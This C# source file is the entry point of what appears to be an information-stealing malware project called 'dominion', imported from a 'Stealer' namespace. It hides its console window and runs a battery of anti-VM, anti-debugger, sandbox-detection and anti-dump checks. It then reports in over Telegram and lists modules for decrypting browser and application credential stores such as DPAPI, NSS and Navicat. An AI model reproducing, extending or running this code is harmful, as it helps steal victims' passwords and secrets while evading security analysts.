using System;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

using dominion.src.dominion.Stealer.General;
using dominion.src.dominion.configuration;
using dominion.src.dominion.Security;
using dominion.src.dominion.Dependencies.Data;

namespace dominion.src
{
    internal class Entry
    {

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        public static void Run()
        {
            if (!Configuration.DebugMode)
            {
                var handle = GetConsoleWindow();
                ShowWindow(handle, SW_HIDE);
            }

            if (Configuration.EnableSecurityChecks)
            {
                RunSecurityChecks();
            }

            // Main Modules
            LogSucess("Successfully initialized Entry.cs");
            LogSucess("Successfully initialized Configuration.cs");
            LogSucess("Successfully initialized Counter.cs");
            LogSucess("Successfully initialized InMemmoryZip.cs");
            LogSucess("Successfully initialized Paths.cs");

            try
            {
                SendMessage().Wait();
            }
            catch (Exception ex)
            {
                Console.Beep();
                LogError("Issue with initializing telegram: " + ex.Message);
                Console.WriteLine(ex);
            }

            // Encryption
            Console.WriteLine("");
            LogSucess("Successfully initialized LocalState.cs");
            LogSucess("Successfully initialized Asn1DerObject.cs");
            LogSucess("Successfully initialized Asn1Der.cs");
            LogSucess("Successfully initialized BlowFish.cs");
            LogSucess("Successfully initialized DpApi.cs");
            LogSucess("Successfully initialized Navicat11Cipher.cs");
            LogSucess("Successfully initialized NSSDumpMasterKey.cs");
            LogSucess("Successfully initialized NSSDecryption.cs");
            LogSucess("Successfully initialized RC4Crypt.cs");
            LogSucess("Successfully initialized TripleDes.cs");
            LogSucess("Successfully initialized Xor.cs");
            LogSucess("Successfully initialized AesGcm.cs");
            LogSucess("Successfully initialized AesGcm256.cs");
            LogSucess("Successfully initialized CngDecryptor.cs");
            LogSucess("Successfully initialized YuAuthenticatedData.cs");
            LogSucess("Successfully initialized LocalEncryptor.cs");
            LogSucess("Successfully initialized LocalState.cs");

            // Hashing
            Console.WriteLine("");
            LogSucess("Successfully initialized PBE.cs");
            LogSucess("Successfully initialized PBKDF2.cs");

            // Sql
            Console.WriteLine("");
            LogSucess("Successfully initialized BerkelyDB.cs");
            LogSucess("Successfully initialized SqLite.cs");

            Console.ReadLine();
        }

        private static void RunSecurityChecks()
        {
            string[] securityModules = {
                "AntiVm.cs", "DetectDebugger.cs", "AntiInjectionCheck.cs", "BehavioralAnomalyCheck.cs",
                "DetectAnalysisTools.cs", "DetectAnyrunMac.cs", "DetectEnvironmentVariables.cs", "DetectHarmonyPatch.cs",
                "DetectILDasm.cs", "DetectInlineHook.cs", "DetectMemoryPatching.cs", "DetectRemoteDebugger.cs",
                "DetectSandbox.cs", "DetectTimingAnalysis.cs", "PreventDump.cs", "ProcessNameCheck.cs", "AntiDumpSectionScramble.cs"
            };

            Action[] securityActions = {
                () => AntiVm.Execute(),
                () => DetectDebugger.Run(),
                () => AntiInjectionCheck.RunChecks(),
                () => BehavioralAnomalyCheck.RunChecks(),
                () => DetectAnalysisTools.Run(),
                () => DetectAnyrunMac.Run(),
                () => DetectEnvironmentVariables.Run(),
                () => DetectHarmonyPatch.Run(),
                () => DetectILDasm.Run(),
                () => DetectInlineHook.Run(),
                () => DetectMemoryPatching.Run(),
                () => DetectRemoteDebugger.Run(),
                () => DetectSandbox.Run(),
                () => DetectTimingAnalysis.Run(),
                () => PreventDump.Run(),
                () => ProcessNameCheck.RunChecks(),
                () => AntiDumpSectionScramble.Run()
            };

            for (int i = 0; i < securityModules.Length; i++)
            {
                Log($"Initializing {securityModules[i]}");
                securityActions[i]();
            }
        }

        private static async Task SendMessage()
        {
            LogSucess("Successfully initialized Sender.cs");
            using (var sender = new Sender())
            {
                await sender.SendHelloMessage();
            }
        }

        public static void Log(string message)
        {
            Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] {message}");
        }

        public static void LogError(string message)
        {
            Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] [X] {message}");
        }

        public static void LogWarning(string message)
        {
            Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] [!] {message}");
        }

        public static void LogSucess(string message)
        {
            Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] [*] {message}");
        }
    }
}